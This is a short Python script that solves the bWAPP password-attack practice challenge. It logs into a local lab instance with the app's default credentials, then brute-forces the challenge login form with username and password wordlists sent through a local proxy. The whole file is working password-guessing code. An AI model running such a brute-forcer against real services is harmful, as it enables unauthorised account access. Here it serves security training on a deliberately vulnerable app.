#!/usr/bin/python

import requests
import re
import argparse

parser=argparse.ArgumentParser()
parser.add_argument('--security',type=str,required=False)
parser.add_argument('--userfile',type=str,required=True)
parser.add_argument('--passfile',type=str,required=True)
args=parser.parse_args()

proxy={'http':'http://127.0.0.1:8080'}
header={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}
print("logging in.....")
url="http://172.16.88.135/bWAPP/login.php"
creds={'login':'bee','password':'bug','security_level':args.security,'form':'submit'}
req=requests.session()
res=req.post(url,proxies=proxy,data=creds,headers=header)
if "portal" in res.text:
    print("logged in . cookies : "+str(req.cookies.get_dict()))
else:
    print("login failed. some error. try again")

print("moving on to auth bruteforce challenge.....")

att_url=res.url.replace(res.url.split('/')[4],'ba_pwd_attacks_1.php')
#print(att_url)
with open(args.userfile,'r') as u:
    users=u.readlines()
    with open(args.passfile,'r') as p:
        passwd=p.readlines()
for line1 in users:
    for line2 in passwd:
        body={'login':line1.strip(),'password':line2.strip(),'form':'submit'}
        res2=req.post(att_url,proxies=proxy,data=body)
        if "Successful login" in res2.text:
            print("login success : {} {}".format(line1.strip(),line2.strip()))
            break



